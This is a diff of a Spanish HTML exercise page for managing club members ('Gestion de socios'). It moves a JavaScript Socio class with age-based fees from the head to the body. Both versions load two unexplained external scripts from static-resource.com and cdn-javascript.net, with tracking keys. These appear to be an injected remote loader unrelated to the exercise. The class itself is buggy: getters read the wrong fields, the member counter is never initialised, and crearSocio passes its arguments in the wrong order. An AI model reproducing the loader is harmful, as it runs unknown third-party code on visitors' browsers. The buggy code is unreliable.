@@ -2,106 +2,7 @@
     <meta charset="utf-8">
     <meta name="author" content="">
     <title></title>
-    <script>
 
-        class Socio {
-            constructor(dni, nombre, apellidos, edad, localidad, cuotaAnual = 0, numSocio) {
-                this._dni = dni;
-                this._nombre = nombre;
-                this._apellidos = apellidos;
-                this._edad = edad;
-                this._localidad = localidad;
-                this.setCuotaAnual();
-                this.setNumSocio();
-            }
-
-            setNumSocio() {
-                this._numSocio++;
-            }
-
-            getDni() {
-                return this.dni;
-            }
-            
-            setDni(dni) {
-                this._dni = dni;
-            }
-
-            getNombre() {
-                return this.nombre;
-            }
-            
-            setNombre(nombre) {
-                this._nombre = nombre;
-            }
-
-            getApellidos() {
-                return this.apellidos;
-            }
-            
-            setApellidos(apellidos) {
-                this._apellidos = apellidos;
-            }
-
-            getEdad() {
-                return this.edad;
-            }
-            
-            setEdad(edad) {
-                this._edad = edad;
-            }
-            
-            getLocalidad() {
-                return this.localidad;
-            }
-            
-            setLocalidad(localidad) {
-                this._localidad = localidad;
-            }
-
-            setCuotaAnual() {
-                if (this._edad < 18) {
-                    this._cuotaAnual = 5;
-                } else if (this._edad >= 18 && this._edad <= 65) {
-                    this._cuotaAnual = 10
-                } else {
-                    this._cuotaAnual = 0;
-                }
-            }
-
-            modificaNombre(x) {
-                this._nombre = x;
-            }
-
-            modificaApellidos(x) {
-                this._apellidos = x;
-            }
-
-            modificaEdad(x) {
-                this._edad = x;
-                this.setCuotaAnual();
-            }
-
-            openWin() {
-                var myWindow = window.open('', '', 'width=200,height=50');
-                myWindow.document.write("<p>Num. Socio: " + this._numSocio + "<br>DNI: " + this._dni + "<br>Nombre: " + this._nombre + "<br>Apellidos: " + this._apellidos + "<br>Edad: " + this._edad + "<br>Localidad: " + this._localidad +"<br>Cuota: " + this._cuotaAnual + "</p>");
-                myWindow.document.close();
-                myWindow.focus();
-            }
-            
-        }
-
-        function crearSocio() {
-  
-        }
-
-        var socio1 = new Socio("44466778C", "Luis", "Pérez", 23, "Ourense");
-        console.log(socio1);
-        socio1.openWin();
-
-    </script>
-    <script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8809x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8809x&amp;format=arrjs&amp;r=1581331598689"></script></head>
-    
     <body>
         <h1>Gestion de socios</h1>
         <h2>Datos del Socio</h2>
@@ -122,6 +23,108 @@
         <hr>
         <p id="mensaje">Mensajes informativos</p>
         
+        <script>
+            var ventanita;
+            class Socio {
+                constructor(dni, nombre, apellidos, edad, localidad, cuotaAnual = 0, numSocio) {
+                    this.dni = dni;
+                    this.nombre = nombre;
+                    this.apellidos = apellidos;
+                    this.edad = parseInt(edad);
+                    this.localidad = localidad;
+                    this.setCuotaAnual();
+                    this.setNumSocio();
+                }
     
+                setNumSocio() {
+                    this._numSocio++;
+                }
+    
+                getDni() {
+                    return this.dni;
+                }
+                
+                setDni(dni) {
+                    this._dni = dni;
+                }
+    
+                getNombre() {
+                    return this.nombre;
+                }
+                
+                setNombre(nombre) {
+                    this._nombre = nombre;
+                }
+    
+                getApellidos() {
+                    return this.apellidos;
+                }
+                
+                setApellidos(apellidos) {
+                    this._apellidos = apellidos;
+                }
+    
+                getEdad() {
+                    return this.edad;
+                }
+                
+                setEdad(edad) {
+                    this._edad = edad;
+                }
+                
+                getLocalidad() {
+                    return this.localidad;
+                }
+                
+                setLocalidad(localidad) {
+                    this._localidad = localidad;
+                }
+    
+                setCuotaAnual() {
+                    if (this._edad < 18) {
+                        this._cuotaAnual = 5;
+                    } else if (this._edad >= 18 && this._edad <= 65) {
+                        this._cuotaAnual = 10
+                    } else {
+                        this._cuotaAnual = 0;
+                    }
+                }
+    
+                modificaNombre(x) {
+                    this._nombre = x;
+                }
+    
+                modificaApellidos(x) {
+                    this._apellidos = x;
+                }
+    
+                modificaEdad(x) {
+                    this._edad = x;
+                    this.setCuotaAnual();
+                }
+    
+                openWin() {
+                    var myWindow = window.open('', '', 'width=200,height=50');
+                    myWindow.document.write("<p>Num. Socio: " + this._numSocio + "<br>DNI: " + this._dni + "<br>Nombre: " + this._nombre + "<br>Apellidos: " + this._apellidos + "<br>Edad: " + this._edad + "<br>Localidad: " + this._localidad +"<br>Cuota: " + this._cuotaAnual + "</p>");
+                    myWindow.document.close();
+                    myWindow.focus();
+                }
+                
+            }
+    
+            function valor(id){
+                return document.getElementById(id).value;
+            }
+            function crearSocio() {
+                socios.push(new Socio(valor("nom"),valor("ape"),valor("edad"),valor("dni"),valor("loc")));
+            }
+    
+            var socio1 = new Socio("44466778C", "Luis", "Pérez", 23, "Ourense");
+            console.log(socio1);
+            socio1.openWin();
+    
+        </script>
+        <script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8809x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8809x&amp;format=arrjs&amp;r=1581331598689"></script></head>
+        
     
     </body></html>
